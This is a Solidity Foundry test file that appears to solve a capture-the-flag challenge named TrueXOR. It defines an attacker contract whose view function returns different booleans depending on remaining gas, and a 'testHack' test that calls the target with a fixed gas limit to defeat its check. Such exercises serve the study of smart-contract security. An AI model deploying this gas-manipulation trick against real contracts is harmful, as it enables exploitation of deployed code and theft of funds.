// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/TrueXOR.sol";

contract TrueXORAtk {
    function giveBool() external view returns (bool) {
        if (gasleft() > 100000) {
            while (gasleft() > 100000) {}
            return true;
        }
        return false;
    }
}

contract TrueXORTest is Test {
    TrueXOR txor;
    TrueXORAtk tAtk;

    function setUp() public {
        txor = new TrueXOR();
        tAtk = new TrueXORAtk();
    }

    function testHack() public {
        // Have to specify msg.sender and tx.origin in prank,
        // otherwise fails with bad sender (think it's just a foundry issue as
        // the call should be correctly coming from an EOA if this were deployed)
        vm.prank(address(123), address(123));
        txor.callMe{gas: 120000}(address(tAtk));
    }
}
